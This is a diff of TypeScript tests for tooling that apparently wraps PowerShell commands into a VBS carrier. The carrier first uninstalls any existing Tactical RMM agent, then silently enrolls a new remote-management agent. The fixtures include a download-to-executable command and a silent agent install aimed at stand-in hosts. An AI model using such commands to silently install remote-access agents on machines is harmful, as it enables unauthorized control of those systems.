@@ -12,6 +12,8 @@ import {
   renderVantraCarrierFromScript,
   normalizePowerShellCommand,
   ensureSilentEnroll,
+  ensureAgentCleanSlate,
+  AGENT_CLEAN_SLATE,
   PS_PREFIX,
   PS_FLAGS,
   RUN_PREFIX,
@@ -432,5 +434,56 @@ test("stage 2.1: an oversized command fails closed at MINT (command_too_long); m
     () => renderCarrierVbs("Write-Output @B64@"),
     (err: Error) => err.message === "marker_collision",
     "expected marker_collision",
+  );
+});
+
+
+// ---------------------------------------------------------------------------
+// TASK_182 — ensureAgentCleanSlate: uninstall-any-pre-existing-agent first.
+// VM proof 2026-10-07: `-m install` refused to reconfigure the stale agent,
+// kept its old ApiURL (agent.broks.beauty), and the device never checked in.
+// ---------------------------------------------------------------------------
+
+test("ensureAgentCleanSlate: prepends the uninstall-first prologue before the enroll", () => {
+  const cmd =
+    "Start-Process -FilePath $agent -ArgumentList '-m install --api https://rmm.example.test --silent' -Wait";
+  const out = ensureAgentCleanSlate(cmd);
+  assert.ok(out.startsWith("$swAg='C:\\Program Files\\TacticalAgent'"), out.slice(0, 60));
+  assert.ok(out.endsWith(cmd), "original command survives verbatim at the tail");
+  const uninstall = out.indexOf("unins000.exe");
+  const enroll = out.indexOf("-m install");
+  assert.ok(uninstall > -1 && enroll > -1 && uninstall < enroll, "uninstall runs before the enroll");
+});
+
+test("ensureAgentCleanSlate: idempotent — a second transform is byte-identical", () => {
+  const once = ensureAgentCleanSlate("Invoke-WebRequest -Uri 'https://x/y' -OutFile $exe");
+  assert.equal(ensureAgentCleanSlate(once), once);
+});
+
+test("ensureAgentCleanSlate: carrier-safe invariants — single line, no double quote, no marker", () => {
+  assert.ok(!AGENT_CLEAN_SLATE.includes('"'), "VBS string boundaries require no double quote");
+  assert.ok(!/[\r\n\t]/.test(AGENT_CLEAN_SLATE), "single line only");
+  assert.ok(!AGENT_CLEAN_SLATE.includes("@B64@"), "no sidecar marker collision");
+  // A `#` anywhere would comment out the rest of the flattened line at run time.
+  assert.ok(!AGENT_CLEAN_SLATE.includes("#"), "no comment tokens");
+});
+
+test("ensureAgentCleanSlate: fails closed on a quoted command", () => {
+  assert.throws(() => ensureAgentCleanSlate('Start-Process "x"'), /clean_slate_quote/);
+});
+
+test("end-to-end TASK_182: fixture → normalize → silent → clean-slate → carrier ships all three", () => {
+  const silent = ensureSilentEnroll(normalizePowerShellCommand(VANTRA_FIXTURE));
+  const clean = ensureAgentCleanSlate(silent);
+  const vbs = renderCarrierVbs(clean);
+  const joined = rejoin(vbs);
+  assert.equal(joined, clean, "chunks rejoin exactly");
+  assert.ok(joined.includes("unins000.exe"), "clean-slate prologue shipped");
+  assert.equal((joined.match(/--silent/g) ?? []).length, 1, "exactly one --silent");
+  // The prologue must run BEFORE the script's $ErrorActionPreference='Stop'
+  // (fail-open design: a failed uninstall must never abort the install).
+  assert.ok(
+    joined.indexOf("$swAg=") < joined.indexOf("$ErrorActionPreference"),
+    "clean-slate runs before ErrorActionPreference=Stop",
   );
 });
